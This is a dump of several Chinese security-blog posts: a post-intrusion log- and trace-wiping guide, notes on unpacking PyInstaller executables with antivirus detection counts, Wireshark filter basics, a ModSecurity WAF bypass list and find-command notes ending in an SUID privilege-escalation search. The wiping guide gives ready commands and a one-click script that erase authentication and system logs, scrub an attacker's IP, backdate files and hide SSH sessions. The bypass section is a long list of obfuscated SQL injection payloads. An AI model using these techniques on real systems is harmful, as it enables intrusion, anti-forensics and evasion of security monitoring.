<h4 id="清除日志"><a href="#清除日志" class="headerlink" title="清除日志"></a>清除日志</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># lastb</span><br><span class="line">echo &gt; /var/log/btmp</span><br><span class="line"># last</span><br><span class="line">echo &gt; /var/log/wtmp</span><br><span class="line"># 清除用户最后一次登录时间</span><br><span class="line">echo &gt; /var/log/lastlog </span><br><span class="line"># 清除安全日志记录</span><br><span class="line">cat /dev/null &gt; /var/log/secure</span><br><span class="line"># 清除系统日志记录</span><br><span class="line">cat /dev/null &gt; /var/log/secure</span><br><span class="line"># 清除当前登录用户的信息</span><br><span class="line">echo &gt; /var/log/utmp </span><br></pre></td></tr></table></figure>

<h4 id="删除所有匹配到字符串的行-比如以当天日期或者自己的登录ip"><a href="#删除所有匹配到字符串的行-比如以当天日期或者自己的登录ip" class="headerlink" title="删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip"></a>删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip</h4><p><code>sed -i &#39;/自己的ip/&#39;d /var/log/messages</code></p>
<h4 id="全局替换自己ip"><a href="#全局替换自己ip" class="headerlink" title="全局替换自己ip"></a>全局替换自己ip</h4><p><code>sed -i &#39;s/192.168.166.85/192.168.1.1/g&#39; secure</code></p>
<p>前面是待替换ip 后面为替换后的ip</p>
<h3 id="时间痕迹清理"><a href="#时间痕迹清理" class="headerlink" title="时间痕迹清理"></a>时间痕迹清理</h3><p><code>ls -al</code> 可以查看创建时间</p>
<h4 id="touch"><a href="#touch" class="headerlink" title="touch"></a>touch</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch -r 目标时间的文件 需要修改时间的文件</span><br><span class="line">touch -d &quot;2018-04-18 08:00:00&quot; Th1s_isnot_flag.txt</span><br><span class="line">-a ： 仅修改access time</span><br><span class="line">-c ：仅修改时间，而不建立文件</span><br><span class="line">-d ：后面可以接日期，也可以使用 --date=&quot;日期或时间&quot;</span><br><span class="line">-m ：仅修改mtime</span><br><span class="line">-t ：后面可以接时间，格式为 [YYMMDDhhmm]</span><br></pre></td></tr></table></figure>

<h4 id="date"><a href="#date" class="headerlink" title="date"></a>date</h4><p><code>date -s 20140712 18:30:50</code> 将当前系统日期修改为2014年07月12 18:30:50</p>
<h4 id="hwclock"><a href="#hwclock" class="headerlink" title="hwclock"></a>hwclock</h4><p><code>hwclock --hctosys</code>  # –hctosys 将系统时钟调整为与目前的硬件时钟一致。</p>
<h3 id="操作痕迹清理"><a href="#操作痕迹清理" class="headerlink" title="操作痕迹清理"></a>操作痕迹清理</h3><h4 id="服务日志修改"><a href="#服务日志修改" class="headerlink" title="服务日志修改"></a>服务日志修改</h4><p># 使用grep -v来把我们的相关信息删除,</p>
<p><code>cat /var/log/nginx/access.log | grep -v evil.php &gt; tmp.log</code></p>
<p># 把修改过的日志覆盖到原日志文件</p>
<p><code>cat tmp.log &gt; /var/log/nginx/access.log/</code> </p>
<h4 id="history记录清理"><a href="#history记录清理" class="headerlink" title="history记录清理"></a>history记录清理</h4><ul>
<li>登录ssh后不记录history</li>
</ul>
<p><code>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null;export HISTSIZE=0; export HISTFILESIZE=0</code></p>
<ul>
<li>清理 <code>~/.bash_history</code></li>
<li><code>history -c </code></li>
<li><code>vim /etc/profile</code> 修改 <code>HISTSIZE=0</code></li>
</ul>
<h4 id="文件覆写"><a href="#文件覆写" class="headerlink" title="文件覆写"></a>文件覆写</h4><ul>
<li>单文件</li>
</ul>
<p><code>shred -f -u -z -v -n 8 1.txt</code></p>
<ul>
<li>文件夹</li>
</ul>
<p><code>wipe -r</code></p>
<h3 id="隐藏ssh登录记录"><a href="#隐藏ssh登录记录" class="headerlink" title="隐藏ssh登录记录"></a>隐藏ssh登录记录</h3><p><code>ssh -T root@192.168.0.1 /bin/bash -i</code></p>
<p><code>ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i</code></p>
<p><code>-o UserKnownHostsFile=/dev/null</code> #这个是knowhost的信息及公钥</p>
<p><code>-T user@host /bin/bash –i</code> #不分配伪终端但是给个bash的终端</p>
<h3 id="一键清除脚本"><a href="#一键清除脚本" class="headerlink" title="一键清除脚本"></a>一键清除脚本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/usr/bin/bash</span></span><br><span class="line">echo &gt; /var/log/syslog</span><br><span class="line">echo &gt; /var/log/messages</span><br><span class="line">echo &gt; /var/log/httpd/access_log</span><br><span class="line">echo &gt; /var/log/httpd/error_log</span><br><span class="line">echo &gt; /var/log/xferlog</span><br><span class="line">echo &gt; /var/log/secure</span><br><span class="line">echo &gt; /var/log/auth.log</span><br><span class="line">echo &gt; /var/log/user.log</span><br><span class="line">echo &gt; /var/log/wtmp</span><br><span class="line">echo &gt; /var/log/lastlog</span><br><span class="line">echo &gt; /var/log/btmp</span><br><span class="line">echo &gt; /var/run/utmp</span><br><span class="line">rm ~/./bash_history</span><br><span class="line">history -c</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>痕迹清理</category>
      </categories>
      <tags>
        <tag>痕迹清理</tag>
      </tags>
  </entry>
  <entry>
    <title>python_pyc反编译</title>
    <url>/posts/76fcd9b1/</url>
    <content><![CDATA[<p><a href="https://mp.weixin.qq.com/s/7ggXt0TkEuN2SabVin5oLA">https://mp.weixin.qq.com/s/7ggXt0TkEuN2SabVin5oLA</a></p>
<p>python  pyinstaller 打包exe免杀</p>
<h3 id="pyinstaller"><a href="#pyinstaller" class="headerlink" title="pyinstaller"></a>pyinstaller</h3><p><code>https://www.virustotal.com/gui/file/8bc40da35383f54998be34e32c0ff22e25dd9c4c8f5df1c10e6f0bb9e431c8b0?nocache=1</code>    3/69</p>
<h3 id="py2exe"><a href="#py2exe" class="headerlink" title="py2exe"></a>py2exe</h3><p>使用py2exe 打包完文件后 会生成多个文件 二 pyinstaller 会生产一个exe</p>
<p><code>https://www.virustotal.com/gui/file/823d00a6d1ab82bbfaa5e997d5192b72cca7dba0e9b2d18d69ecf15e75fff9e7?nocache=1</code>  5/69</p>
<h3 id="反编译pyinstaller打包的exe文件"><a href="#反编译pyinstaller打包的exe文件" class="headerlink" title="反编译pyinstaller打包的exe文件"></a>反编译pyinstaller打包的exe文件</h3><p><a href="https://github.com/countercept/Python-exe-unpacker">https://github.com/countercept/Python-exe-unpacker</a></p>
<p>pyinstaller在打包pyc时，会去掉pyc的<code>magic</code>和<code>时间戳</code>。需要进行手工修复。pyinstaller在打包的系统库的时候是不会去掉magic的，所以查看一下系统库的magic即可</p>
<p>在将exe 转换为pyc文件有两种方法 如下</p>
<h4 id="将-exe-文件转换为-pyc-文件"><a href="#将-exe-文件转换为-pyc-文件" class="headerlink" title="将 exe 文件转换为 pyc 文件"></a>将 exe 文件转换为 pyc 文件</h4><h5 id="使用-pyinstxtractor-py"><a href="#使用-pyinstxtractor-py" class="headerlink" title="使用 pyinstxtractor.py"></a>使用 pyinstxtractor.py</h5><p><a href="https://sourceforge.net/projects/pyinstallerextractor/">https://sourceforge.net/projects/pyinstallerextractor/</a></p>
<p>将exe 和 pyinstxtractor.py 放在同一目录下</p>
<p><code>python pyinstxtractor.py test.exe</code></p>
<p>然后会生成</p>
<p><img src="/posts/76fcd9b1/1.PNG" alt="截图"></p>
<br>

<h5 id="使用pyi-archive-viewer"><a href="#使用pyi-archive-viewer" class="headerlink" title="使用pyi-archive_viewer"></a>使用pyi-archive_viewer</h5><p>二是使用pyi-archive_viewer命令（需要安装pyinstaller）</p>
<p><code>pyi-archive_viewer test.exe</code></p>
<p><img src="/posts/76fcd9b1/pyi-archive_viewer1.PNG" alt="截图"></p>
<p><img src="/posts/76fcd9b1/pyi-archive_viewer2.PNG" alt="截图"></p>
<p>这样会生成一个test2.pyc文件 然后恢复被pyinstaller 打包后删除的字节</p>
<h4 id="修复pyc-文件"><a href="#修复pyc-文件" class="headerlink" title="修复pyc 文件"></a>修复pyc 文件</h4><p>在<code>test.exe_extracted</code>文件下 存在struct 和 test 两文件<br><img src="/posts/76fcd9b1/3.PNG" alt="截图"></p>
<p>使用010editor打开 将struct的第一行插入到test的第一行<br><img src="/posts/76fcd9b1/4.PNG" alt="截图"><br><img src="/posts/76fcd9b1/5.PNG" alt="截图"></p>
<p>添加后<br><img src="/posts/76fcd9b1/6.PNG" alt="截图"><br> 另存为test.pyc即可</p>
<h4 id="将pyc文件转换为python代码"><a href="#将pyc文件转换为python代码" class="headerlink" title="将pyc文件转换为python代码"></a>将pyc文件转换为python代码</h4><h5 id="在线pyc反编译"><a href="#在线pyc反编译" class="headerlink" title="在线pyc反编译"></a>在线pyc反编译</h5><p> <a href="https://tool.lu/pyc">https://tool.lu/pyc</a></p>
<p><img src="/posts/76fcd9b1/7.PNG" alt="截图"></p>
<h5 id="使用-uncompyle6"><a href="#使用-uncompyle6" class="headerlink" title="使用 uncompyle6"></a>使用 <code>uncompyle6</code></h5><p> (需要使用pip 安装 <code>pip install uncompyle6</code>  但是不支持python3.9版本) </p>
<p><code>uncompyle6 test.pyc</code> 即可查看python代码<br><img src="/posts/76fcd9b1/8.PNG" alt="截图"><br>也可以将内容保存到test.py <code>uncompyle6 test.pyc &gt; test.py</code></p>
<p>踩坑：<br>（在使用时 由于本机内python环境比较复杂  有三个环境 结果搞得版本不统一 然后一直报错pyc的magic 失败 看了下<a href="https://fishc.com.cn/forum.php?mod=viewthread&tid=131172&highlight=pyc+%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD">https://fishc.com.cn/forum.php?mod=viewthread&amp;tid=131172&amp;highlight=pyc%2B%B7%B4%BB%E3%B1%E0</a> 意识到了这个问题） 在虚拟机上就可以成功避免这种问题</p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://xz.aliyun.com/t/10450#toc-11">https://xz.aliyun.com/t/10450#toc-11</a></p>
<p><a href="https://fishc.com.cn/thread-131172-1-1.html">https://fishc.com.cn/thread-131172-1-1.html</a></p>
<p><a href="https://jishuin.proginn.com/p/763bfbd69fa1">https://jishuin.proginn.com/p/763bfbd69fa1</a></p>
<p><a href="https://www.cxymm.net/article/qq_36078992/103596170">https://www.cxymm.net/article/qq_36078992/103596170</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>wireshark学习-1</title>
    <url>/posts/6c4c4fdf/</url>
    <content><![CDATA[<h3 id="wireshark默认显示方式"><a href="#wireshark默认显示方式" class="headerlink" title="wireshark默认显示方式"></a>wireshark默认显示方式</h3><p><img src="/posts/6c4c4fdf/1.png" alt="截图"></p>
<h3 id="wireshark中-默认的列"><a href="#wireshark中-默认的列" class="headerlink" title="wireshark中 默认的列"></a>wireshark中 默认的列</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">No. ：捕获的数据帧序号，第一帧始终为 1。</span><br><span class="line">Time ：从捕获的第一帧开始的计算的时间（单位为纳秒），第一帧标记为 0.000000。</span><br><span class="line">Source ：源地址，通常是 IPv4、IPv6 或者 以太网地址。</span><br><span class="line">Destination ：目的地址，通常是 IPv4、IPv6 或者 以太网地址。</span><br><span class="line">Protocol ：以太网帧、IP数据包、TCP分片所使用的协议（ARP、DNS、TCP、HTTP等）。</span><br><span class="line">Length ：数据帧长度（单位为字节）。</span><br></pre></td></tr></table></figure>

<h4 id="隐藏不需要的列"><a href="#隐藏不需要的列" class="headerlink" title="隐藏不需要的列"></a>隐藏不需要的列</h4><p>可以通过右键标题栏 选择隐藏不需要的列</p>
<h4 id="删除不需要的列"><a href="#删除不需要的列" class="headerlink" title="删除不需要的列"></a>删除不需要的列</h4><p>如果有些列用不到 可以选择该列后右键 -&gt; Remove This Column 进行删除</p>
<h4 id="添加需要的列"><a href="#添加需要的列" class="headerlink" title="添加需要的列"></a>添加需要的列</h4><p>右键点击标题栏 选择<code>Column Preferences</code> 点击左下角的 <code>+</code>  列表中将会出现一个标题为New Column的表项。</p>
<h4 id="修改时间格式"><a href="#修改时间格式" class="headerlink" title="修改时间格式"></a>修改时间格式</h4><p>点击菜单栏的 <code>视图</code> 选择 <code>时间显示格式</code> 可以去选择<code>UTC</code> 秒等</p>
<h4 id="添加自定义列"><a href="#添加自定义列" class="headerlink" title="添加自定义列"></a>添加自定义列</h4><p>可以选择数据包细节窗口 选择需要添加的数据 右键点击应用为列 即可成功添加</p>
<hr>
<p>背景为红色 =&gt; 这个表达式尚未被接受</p>
<p>背景为绿色 =&gt; 这个表达式可以正常工作</p>
<p>背景为黄色 =&gt; 这个表达式可以被接受，但是可能不会按预期工作</p>
<br>

<p>wireshark 显示过滤器   布尔表达式</p>
<ul>
<li>等于        ==  或 eq</li>
<li>且            &amp;&amp; 或 and</li>
<li>或             ||       或 or</li>
</ul>
<br>

<p>eg</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.addr eq 192.168.10.195 and ip.addr == 192.168.10.1</span><br><span class="line"></span><br><span class="line">http.request &amp;&amp; ip.addr == 192.168.10.195</span><br><span class="line"></span><br><span class="line">http.request || http.response</span><br><span class="line"></span><br><span class="line">dns.qry.name contains microsoft or dns.qry.name contains windows</span><br></pre></td></tr></table></figure>

<br>

<p>选择排除特定值时 不要在表达式中使用 != </p>
<p>可以使用<code>!(ip.addr == 192.168.10.1)</code>  而不是使用<code>ip.addr != 192.168.10.1</code></p>
<br>

<p><code>http.request or ssl.handshake.type == 1</code></p>
<p><code>http.request</code>  </p>
<p><code>ssl.handshake.type == 1</code></p>
<br>

<hr>
<h3 id="识别主机和用户"><a href="#识别主机和用户" class="headerlink" title="识别主机和用户"></a>识别主机和用户</h3><h4 id="dhcp"><a href="#dhcp" class="headerlink" title="dhcp"></a>dhcp</h4><br>

<h4 id="nbns"><a href="#nbns" class="headerlink" title="nbns"></a>nbns</h4>]]></content>
  </entry>
  <entry>
    <title>Modsecuity_bypass</title>
    <url>/posts/1460cbad/</url>
    <content><![CDATA[<h3 id="Union-Select"><a href="#Union-Select" class="headerlink" title="Union Select"></a>Union Select</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*!50000%55nIoN*/ /*!50000%53eLeCt*/</span><br><span class="line">%55nion(%53elect 1,2,3)-- -</span><br><span class="line">+union+distinct+select+</span><br><span class="line">+union+distinctROW+select+</span><br><span class="line">/**//*!12345UNION SELECT*//**/</span><br><span class="line">/**//*!50000UNION SELECT*//**/</span><br><span class="line">/**/UNION/**//*!50000SELECT*//**/</span><br><span class="line">/*!50000UniON SeLeCt*/</span><br><span class="line">union /*!50000%53elect*/</span><br><span class="line">+ #?uNiOn + #?sEleCt</span><br><span class="line">+ #?1q %0AuNiOn all#qa%0A#%0AsEleCt</span><br><span class="line">/*!%55NiOn*/ /*!%53eLEct*/</span><br><span class="line">/*!u%6eion*/ /*!se%6cect*/</span><br><span class="line">+un/**/ion+se/**/lect</span><br><span class="line">uni%0bon+se%0blect</span><br><span class="line">%2f**%2funion%2f**%2fselect</span><br><span class="line">union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A</span><br><span class="line">REVERSE(noinu)+REVERSE(tceles)</span><br><span class="line">/*--*/union/*--*/select/*--*/</span><br><span class="line">union (/*!/**/ SeleCT */ 1,2,3)</span><br><span class="line">/*!union*/+/*!select*/</span><br><span class="line">union+/*!select*/</span><br><span class="line">/**/union/**/select/**/</span><br><span class="line">/**/uNIon/**/sEleCt/**/</span><br><span class="line">+%2F**/+Union/*!select*/</span><br><span class="line">/**//*!union*//**//*!select*//**/</span><br><span class="line">/*!uNIOn*/ /*!SelECt*/</span><br><span class="line">+union+distinct+select+</span><br><span class="line">+union+distinctROW+select+</span><br><span class="line">uNiOn aLl sElEcT</span><br><span class="line">UNIunionON+SELselectECT</span><br><span class="line">/**/union/*!50000select*//**/</span><br><span class="line">0%a0union%a0select%09</span><br><span class="line">%0Aunion%0Aselect%0A</span><br><span class="line">%55nion/**/%53elect</span><br><span class="line">uni&lt;on all=&quot;&quot; sel=&quot;&quot;&gt;/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/</span><br><span class="line">%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/</span><br><span class="line">%0A%09UNION%0CSELECT%10NULL%</span><br><span class="line">/*!union*//*--*//*!all*//*--*//*!select*/</span><br><span class="line">union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C</span><br><span class="line">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/</span><br><span class="line">+UnIoN/*&amp;a=*/SeLeCT/*&amp;a=*/</span><br><span class="line">union+sel%0bect</span><br><span class="line">+uni*on+sel*ect+</span><br><span class="line">+#1q%0Aunion all#qa%0A#%0Aselect</span><br><span class="line">union(select (1),(2),(3),(4),(5))</span><br><span class="line">UNION(SELECT(column)FROM(table))</span><br><span class="line">%23xyz%0AUnIOn%23xyz%0ASeLecT+</span><br><span class="line">%23xyz%0A%55nIOn%23xyz%0A%53eLecT+</span><br><span class="line">union(select(1),2,3)</span><br><span class="line">union (select 1111,2222,3333)</span><br><span class="line">uNioN (/*!/**/ SeleCT */ 11)</span><br><span class="line">union (select 1111,2222,3333)</span><br><span class="line">+#1q%0AuNiOn all#qa%0A#%0AsEleCt</span><br><span class="line">/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/</span><br><span class="line">%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/</span><br><span class="line">+%23sexsexsex%0AUnIOn%23sexsexs ex%0ASeLecT+</span><br><span class="line">+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C</span><br><span class="line">/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/</span><br><span class="line">+%23blobblobblob%0aUnIOn%23blobblobblob%0aSeLe cT+</span><br><span class="line">/*!blobblobblob%0d%0aunion*/+/*!blobblobblob%0d%0aSelEct*/</span><br><span class="line">/union\sselect/g</span><br><span class="line">/union\s+select/i</span><br><span class="line">/*!UnIoN*/SeLeCT</span><br><span class="line">+UnIoN/*&amp;a=*/SeLeCT/*&amp;a=*/</span><br><span class="line">+uni&gt;on+sel&gt;ect+</span><br><span class="line">+(UnIoN)+(SelECT)+</span><br><span class="line">+(UnI)(oN)+(SeL)(EcT)</span><br><span class="line">+’UnI”On’+&#x27;SeL”ECT’</span><br><span class="line">+uni on+sel ect+</span><br><span class="line">+/*!UnIoN*/+/*!SeLeCt*/+</span><br><span class="line">/*!u%6eion*/ /*!se%6cect*/</span><br><span class="line">uni%20union%20/*!select*/%20</span><br><span class="line">union%23aa%0Aselect</span><br><span class="line">/**/union/*!50000select*/</span><br><span class="line">/^.*union.*$/ /^.*select.*$/</span><br><span class="line">/*union*/union/*select*/select+</span><br><span class="line">/*uni X on*/union/*sel X ect*/</span><br><span class="line">+un/**/ion+sel/**/ect+</span><br><span class="line">+UnIOn%0d%0aSeleCt%0d%0a</span><br><span class="line">UNION/*&amp;test=1*/SELECT/*&amp;pwn=2*/</span><br><span class="line">un?&lt;ion sel=&quot;&quot;&gt;+un/**/ion+se/**/lect+</span><br><span class="line">+UNunionION+SEselectLECT+</span><br><span class="line">+uni%0bon+se%0blect+</span><br><span class="line">%252f%252a*/union%252f%252a /select%252f%252a*/</span><br><span class="line">/%2A%2A/union/%2A%2A/select/%2A%2A/</span><br><span class="line">%2f**%2funion%2f**%2fselect%2f**%2f</span><br><span class="line">union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A</span><br><span class="line">/*!UnIoN*/SeLecT+</span><br></pre></td></tr></table></figure>

<h3 id="Concat"><a href="#Concat" class="headerlink" title="Concat"></a>Concat</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CoNcAt()</span><br><span class="line">concat() </span><br><span class="line">CON%08CAT()</span><br><span class="line">CoNcAt()</span><br><span class="line">%0AcOnCat()</span><br><span class="line">/**//*!12345cOnCat*/</span><br><span class="line">/*!50000cOnCat*/(/*!*/)</span><br><span class="line">unhex(hex(concat(table_name)))</span><br><span class="line">unhex(hex(/*!12345concat*/(table_name)))</span><br><span class="line">unhex(hex(/*!50000concat*/(table_name)))</span><br></pre></td></tr></table></figure>

<h3 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat"></a>group_concat</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*!group_concat*/()</span><br><span class="line">gRoUp_cOnCAt()</span><br><span class="line">group_concat(/*!*/)</span><br><span class="line">group_concat(/*!12345table_name*/)</span><br><span class="line">group_concat(/*!50000table_name*/)</span><br><span class="line">/*!group_concat*/(/*!12345table_name*/)</span><br><span class="line">/*!group_concat*/(/*!50000table_name*/)</span><br><span class="line">/*!12345group_concat*/(/*!12345table_name*/)</span><br><span class="line">/*!50000group_concat*/(/*!50000table_name*/)</span><br><span class="line">/*!GrOuP_ConCaT*/()</span><br><span class="line">/*!12345GroUP_ConCat*/()</span><br><span class="line">/*!50000gRouP_cOnCaT*/()</span><br><span class="line">/*!50000Gr%6fuP_c%6fnCAT*/()</span><br><span class="line">unhex(hex(group_concat(table_name)))</span><br><span class="line">unhex(hex(/*!group_concat*/(/*!table_name*/)))</span><br><span class="line">unhex(hex(/*!12345group_concat*/(table_name)))</span><br><span class="line">unhex(hex(/*!12345group_concat*/(/*!table_name*/)))</span><br><span class="line">unhex(hex(/*!12345group_concat*/(/*!12345table_name*/)))</span><br><span class="line">unhex(hex(/*!50000group_concat*/(table_name)))</span><br><span class="line">unhex(hex(/*!50000group_concat*/(/*!table_name*/)))</span><br><span class="line">unhex(hex(/*!50000group_concat*/(/*!50000table_name*/)))</span><br><span class="line">convert(group_concat(table_name)+using+ascii)</span><br><span class="line">convert(group_concat(/*!table_name*/)+using+ascii)</span><br><span class="line">convert(group_concat(/*!12345table_name*/)+using+ascii)</span><br><span class="line">convert(group_concat(/*!50000table_name*/)+using+ascii)</span><br><span class="line">CONVERT(group_concat(table_name)+USING+latin1)</span><br></pre></td></tr></table></figure>

<h3 id="Information-schema-tables"><a href="#Information-schema-tables" class="headerlink" title="Information_schema.tables"></a>Information_schema.tables</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -</span><br><span class="line">/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA()-- -</span><br><span class="line">/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -</span><br><span class="line">/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -</span><br><span class="line">/*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table</span><br><span class="line">/*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ like hex table</span><br></pre></td></tr></table></figure>

<br>

<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NDQzMDg0MQ==&amp;mid=2247499025&amp;idx=1&amp;sn=90afd42d92e404d30792b6ee92597b92">https://mp.weixin.qq.com/s?__biz=Mzg3NDQzMDg0MQ==&amp;mid=2247499025&amp;idx=1&amp;sn=90afd42d92e404d30792b6ee92597b92</a></p>
<p><a href="https://y000o.medium.com/how-to-bypass-mod-security-waf-156e2315b8ad">https://y000o.medium.com/how-to-bypass-mod-security-waf-156e2315b8ad</a></p>
</blockquote>
]]></content>
      <categories>
        <category>bypass</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>find命令与提权</title>
    <url>/posts/355e240e/</url>
    <content><![CDATA[<h3 id="find命令"><a href="#find命令" class="headerlink" title="find命令"></a>find命令</h3><table>
<thead>
<tr>
<th>选项</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>–help  -help</td>
<td>帮助</td>
</tr>
<tr>
<td>-name</td>
<td>按文件名查找</td>
</tr>
<tr>
<td>-iname</td>
<td>效果与-name类似，但忽略字符大小写</td>
</tr>
<tr>
<td>-type</td>
<td>只寻找符合指定的文件类型的文件,  d 目录       f 文件        c 字符设备文件         b 块设备文件</td>
</tr>
<tr>
<td>-print</td>
<td>将文件或目录名称列出到标准输出。格式为每列一个名称，每个名称前皆有”./“字符串</td>
</tr>
<tr>
<td>-prune</td>
<td>如果文件是一个目录，就不会进入此目录</td>
</tr>
<tr>
<td>-size n</td>
<td>n是文件大小单位</td>
</tr>
<tr>
<td>-perm</td>
<td>按照文件权限来查找文件，4000，2000,1000为分别表示SUID,SGID,SBIT，如777为普通文件的最高权限，7000为特殊文件的最高权限</td>
</tr>
<tr>
<td>-exec</td>
<td>find命令对匹配的文件执行该参数所给出的shell命令。相应命令的形式为’command’ { } ;，注意{ }和\；之间的空格</td>
</tr>
</tbody></table>
<p>实例</p>
<p><code>find .</code> 列出当前目录及子目录下的所有文件和文件夹</p>
<p><code>find .  -name  &quot;*-txt&quot;</code>  找出当前文件加下的.txt文件</p>
<p><code>find . -nmae &quot;*.txt&quot; -o -name &quot;*.py&quot;</code> 找出当前文件夹下的.txt文件和子目录下的.py文件</p>
<p><code>find . ! -name  &quot;*-txt&quot; </code> 找出当前目录下不为.txt的文件</p>
<p><code>find . -type &lt;类型参数&gt;</code></p>
<table>
<thead>
<tr>
<th>类型参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>f</td>
<td>普通文件</td>
</tr>
<tr>
<td>d</td>
<td>目录</td>
</tr>
<tr>
<td>p</td>
<td>管道FIFO</td>
</tr>
<tr>
<td>s</td>
<td>套接字</td>
</tr>
<tr>
<td>l</td>
<td>符号连接</td>
</tr>
<tr>
<td>b</td>
<td>块设备</td>
</tr>
<tr>
<td>c</td>
<td>字符设备</td>
</tr>
</tbody></table>
<p><code>find . -type f -name &quot;*-txt&quot;  -delete </code> 删除匹配的txt文件</p>
<p><code>find  -perm -777  -type f | sort</code> 查找权限为777的文件或目录并排序</p>
<p><code>find -type f -name &quot;*.txt&quot; -exec cat &#123;&#125; \; &gt; all.txt</code> 将所有的txt文件拼接并写入到all.txt</p>
<p>单行命令的-exec无法执行多个命令，执行多行命令的话就需要创建一个test.sh  这里为了方便直接给777权限 <code>chmod 777 test.sh</code></p>
<p>test.sh 内容为下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">cat all.txt</span><br></pre></td></tr></table></figure>

<p><code>find &#39;all.txt&#39; -exec  ./test.sh  &#123;&#125; \;</code></p>
<p><img src="/posts/355e240e/find_exec_sh.png"></p>
<h3 id="2-gt-dev-null"><a href="#2-gt-dev-null" class="headerlink" title="2&gt; /dev/null"></a>2&gt; /dev/null</h3><br>

<p>文件描述符</p>
<p>0    标准输入(stdin)</p>
<p>1    标准输出(stdout)</p>
<p>2    标准错误(stderror)</p>
<p>重定向</p>
<p><code>&gt;</code> 清空文件 再写入内容</p>
<p><code>&gt;&gt;</code> 追加到文件尾部</p>
<p><code>2&gt;/dev/null</code><br>意思就是把错误输出到“黑洞”</p>
<p><code>&gt;/dev/null 2&gt;&amp;1</code></p>
<p>默认情况是1，也就是等同于1&gt;/dev/null 2&gt;&amp;1。意思就是把标准输出重定向到“黑洞”，还把错误输出2重定向到标准输出1，也就是标准输出和错误输出都进了“黑洞”<br><code>2&gt;&amp;1 &gt;/dev/null</code><br>意思就是把错误输出2重定向到标准出书1，也就是屏幕，标准输出进了“黑洞”，也就是标准输出进了黑洞，错误输出打印到屏幕</p>
<h3 id="Linux下的权限"><a href="#Linux下的权限" class="headerlink" title="Linux下的权限"></a>Linux下的权限</h3><p>Linux下权限的属组有 拥有者 、群组 、其它组 三种，设置不同的rwx权限。</p>
<p>Linux下文件的权限类型一般包括读，写，执行，即r，w，x。</p>
<blockquote>
<p>r=4，w=2，x=1<br>rwx = 4 + 2 + 1 = 7<br>rw = 4 + 2 = 6<br>rx = 4 +1 = 5</p>
</blockquote>
<p>一般表示一个文件所有权限详情的有两种方式</p>
<p>一种是十进制，十进制的常用表示形式</p>
<blockquote>
<p>-rw——- (600)    只有拥有者有读写权限。<br>-rw-r–r– (644)    只有拥有者有读写权限；而属组用户和其他用户只有读权限。<br>-rwx—— (700)    只有拥有者有读、写、执行权限。<br>-rwxr-xr-x (755)    拥有者有读、写、执行权限；而属组用户和其他用户只有读、执行权限。<br>-rwx–x–x (711)    拥有者有读、写、执行权限；而属组用户和其他用户只有执行权限。<br>-rw-rw-rw- (666)    所有用户都有文件读、写权限。<br>-rwxrwxrwx (777)    所有用户都有读、写、执行权限。</p>
</blockquote>
<p>另一种是十二进制</p>
<p>linux除了设置正常的读写操作权限外，还有关于一类设置也是涉及到权限，叫做Linxu附加权限。包括 SET位权限（suid，sgid）和粘滞位权限（sticky）</p>
<p>s权限(SetUID，SetGID)</p>
<p>SetUID    只能应用于二进制可执行文件*</p>
<p>SetGID    可应用于二进制可执行文件*和目录</p>
<p>4代表SetUID，2代表SetGID，6则是两者都置位</p>
<p><code>chmod 4777 xxx</code></p>
<p><code>chmod 2777 xxx</code></p>
<p><code>chmod 6777 xxx</code></p>
<p><code>chmod </code></p>
<br>

<h3 id="find提权"><a href="#find提权" class="headerlink" title="find提权"></a>find提权</h3><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<br>

